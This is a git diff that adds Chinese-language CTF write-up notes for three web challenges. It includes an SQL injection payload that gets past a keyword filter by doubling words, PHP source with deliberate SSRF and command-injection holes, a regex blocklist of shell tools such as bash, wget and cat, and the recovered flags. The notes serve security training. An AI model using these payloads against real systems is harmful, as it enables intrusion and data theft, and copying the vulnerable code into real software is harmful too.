@@ -1122,6 +1122,158 @@ php7.x,emmm还用说吗
 
 
 
+### babysql
+
+单引号闭合
+
+过滤:`union,or,select,from,where`
+
+payload:
+
+```
+1'+uniunionon+seleselectct+1,2,3#
+information_schema,test,performance_schema,mysql,geek,ctf
+ctf.Flag :Flag
+
+```
+
+flag{76538e19-fc33-494f-ab67-494f9d5f5c94}
+
+
+
+### ssrfme
+
+```shell
+<?php
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
+    }
+
+    echo $_SERVER["REMOTE_ADDR"];
+
+    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
+    @mkdir($sandbox);
+    @chdir($sandbox);
+
+    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
+    $info = pathinfo($_GET["filename"]);
+    $dir  = str_replace(".", "", basename($info["dirname"]));
+    @mkdir($dir);
+    @chdir($dir);
+    @file_put_contents(basename($info["basename"]), $data);
+    highlight_file(__FILE__);
+```
+
+遇到服务端请求文件,我想到file协议来读取文件
+
+gopher协议端口扫描
+
+以及dump下GET命令来进一步分析
+
+
+
+gopher协议扫描发现只开放了80端口
+
+尝试下载GET命令
+
+`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
+
+在`/usr/bin/GET`找到命令脚本
+
+```
+    -m <method>   use method for the request (default is '$method')
+    -f            make request even if $progname believes method is illegal
+    -b <base>     Use the specified URL as base
+    -t <timeout>  Set timeout value
+    -i <time>     Set the If-Modified-Since header on the request
+    -c <conttype> use this content-type for POST, PUT, CHECKIN
+    -a            Use text mode for content I/O
+    -p <proxyurl> use this as a proxy
+    -P            don't load proxy settings from environment
+    -H <header>   send this HTTP header (you can specify several)
+    -C <username>:<password>
+                  provide credentials for basic authentication
+
+    -u            Display method and URL before any response
+    -U            Display request headers (implies -u)
+    -s            Display response status code
+    -S            Display response status chain (implies -u)
+    -e            Display response headers (implies -s)
+    -E            Display whole chain of headers (implies -S and -U)
+    -d            Do not display content
+    -o <format>   Process HTML content in various ways
+
+    -v            Show program version
+    -h            Print this message
+```
+
+看了看没啥好利用的参数
+
+最后看了wp
+
+```
+flag{b9c51db6-510f-41ab-860a-165afc3bb508}
+```
+
+
+
+
+
+### easyweb
+
+
+
+```php
+<?php
+error_reporting(E_ALL || ~ E_NOTICE);
+header('content-type:text/html;charset=utf-8');
+$cmd = $_GET['cmd'];
+if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
+    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
+$file = hex2bin(base64_decode(base64_decode($_GET['img'])));
+
+$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
+if (preg_match("/flag/i", $file)) {
+    echo '<img src ="./ctf3.jpeg">';
+    die("xixiï½ no flag");
+} else {
+    $txt = base64_encode(file_get_contents($file));
+    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
+    echo "<br>";
+}
+echo $cmd;
+echo "<br>";
+if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
+    echo("forbid ~");
+    echo "<br>";
+} else {
+    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
+        echo `$cmd`;
+    } else {
+        echo ("md5 is funny ~");
+    }
+}
+
+?>
+<html>
+<style>
+  body{
+   background:url(./bj.png)  no-repeat center center;
+   background-size:cover;
+   background-attachment:fixed;
+   background-color:#CCCCCC;
+}
+</style>
+<body>
+</body>
+</html>
+```
+
+
+
+
+
 ## jarvisoj
 
 ### re?
@@ -3726,3 +3878,4 @@ self.render_template('timer.html', { 'timer' : timer })
 
 
 这一题data**协议也能做**
+
